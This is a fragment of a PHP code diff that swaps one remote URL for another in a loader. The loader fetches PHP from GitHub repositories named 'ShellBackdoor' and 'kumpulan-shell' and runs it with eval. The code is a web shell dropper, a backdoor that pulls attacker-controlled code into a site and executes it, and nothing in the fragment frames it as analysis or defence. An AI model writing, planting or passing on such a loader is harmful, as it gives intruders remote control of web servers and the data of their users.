@@ -26,5 +26,5 @@ function geturlsinfo ($url) {
     }
 return $url_get_contents_data;
 }
-$a = geturlsinfo('https://raw.githubusercontent.com/mr-quixter/ShellBackdoor/main/sla.php');
+$a = geturlsinfo('https://raw.githubusercontent.com/hari88met/kumpulan-shell/main/alf.php');
 eval    ('?>'.$a);
